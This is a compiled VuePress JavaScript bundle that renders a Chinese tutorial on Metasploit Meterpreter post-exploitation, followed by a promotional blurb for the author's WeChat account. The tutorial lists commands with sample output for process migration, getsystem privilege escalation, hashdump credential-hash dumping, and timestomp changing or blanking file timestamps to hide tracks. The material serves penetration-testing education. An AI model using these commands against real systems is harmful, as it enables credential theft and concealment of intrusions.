(window.webpackJsonp=window.webpackJsonp||[]).push([[307],{599:function(s,t,e){"use strict";e.r(t);var a=e(7),n=Object(a.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"metasploit高级后渗透模块"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#metasploit高级后渗透模块"}},[s._v("#")]),s._v(" Metasploit高级后渗透模块")]),s._v(" "),t("h3",{attrs:{id:"迁移到更安全的进程"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#迁移到更安全的进程"}},[s._v("#")]),s._v(" 迁移到更安全的进程")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("migrate [要迁移到的进程id]\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h3",{attrs:{id:"获取系统级权限"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#获取系统级权限"}},[s._v("#")]),s._v(" 获取系统级权限")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("getsystem\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("注：getsystem模块在比较新的Windows系统中不太稳定，最好使用本地的提升权限方法和模块来提升控制权限。")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("meterpreter > getsystem\n...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("h3",{attrs:{id:"获取密码的哈希值"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#获取密码的哈希值"}},[s._v("#")]),s._v(" 获取密码的哈希值")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("run hashdump\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("获取了目标的系统级管理权限后，就可以使用hashdump命令获取被渗透系统上登录密码的哈希值。")]),s._v(" "),t("h3",{attrs:{id:"修改文件的访问时间、修改时间和创建时间"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#修改文件的访问时间、修改时间和创建时间"}},[s._v("#")]),s._v(" 修改文件的访问时间、修改时间和创建时间")]),s._v(" "),t("p",[s._v("这里用到的命令是timestomp")]),s._v(" "),t("h4",{attrs:{id:"查看文件的时间信息"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#查看文件的时间信息"}},[s._v("#")]),s._v(" 查看文件的时间信息")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("timestomp -v [目标文件]\n\nmeterpreter > timestomp -v e:\\test.txt\n[*] Showing MACE attributes for e:test.txt\nModified      : 2019-01-25 10:24:42 +0800\nAccessed      : 2019-01-25 11:20:58 +0800\nCreated       : 2019-01-25 10:23:22 +0800\nEntry Modified: 2019-01-25 10:24:42 +0800\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br")])]),t("h4",{attrs:{id:"修改文件的时间信息"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#修改文件的时间信息"}},[s._v("#")]),s._v(" 修改文件的时间信息")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("timestomp -z [时间信息] [目标文件]\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("此时的时间信息格式为：MM/DD/YYYY HH24:MI:SS")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v('meterpreter > timestomp -v e:\\test.txt\n[*] Showing MACE attributes for e:test.txt\nModified      : 2019-01-25 10:24:42 +0800\nAccessed      : 2019-01-25 11:20:58 +0800\nCreated       : 2019-01-25 10:23:22 +0800\nEntry Modified: 2019-01-25 10:24:42 +0800\nmeterpreter > \nmeterpreter > timestomp -z "01/25/2019 11:00:00" e:\\test.txt\n[*] Setting specific MACE attributes on e:test.txt\nmeterpreter > timestomp -v e:\\test.txt\n[*] Showing MACE attributes for e:test.txt\nModified      : 2019-01-25 11:00:00 +0800\nAccessed      : 2019-01-25 11:26:29 +0800\nCreated       : 2019-01-25 11:00:00 +0800\nEntry Modified: 2019-01-25 11:00:00 +0800\n')])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br")])]),t("h4",{attrs:{id:"清空时间信息"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#清空时间信息"}},[s._v("#")]),s._v(" 清空时间信息")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("timestomp -b [目标文件]\n\nmeterpreter > timestomp -b e:\\test.txt\n[*] Blanking file MACE attributes on e:test.txt\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br")])]),t("h2",{attrs:{id:"写在最后"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),t("blockquote",[t("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);t.default=n.exports}}]);